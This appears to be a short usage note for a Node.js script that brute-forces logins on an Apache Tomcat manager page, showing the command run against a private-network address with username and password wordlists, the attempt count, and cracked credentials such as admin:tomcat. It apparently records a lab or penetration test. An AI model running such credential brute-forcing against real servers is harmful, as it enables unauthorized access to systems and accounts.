##tomcat_manager_login_brute_force_test.js
```javascript
####### node tomcat_manager_login_brute_force_test.js http://192.168.152.132:8080/manager/html usname.txt passwd.txt
Total Count:28448
------
Good luck: {403} tomcat:tomcat
Good luck: {200} admin:tomcat
Good luck: {403} 123:195641195641
------
Cost time: 21.514

```

####Then
user `admin` having password `tomcat` show be in the admin role.
user `tomcat` and `123` show be in the user role. 
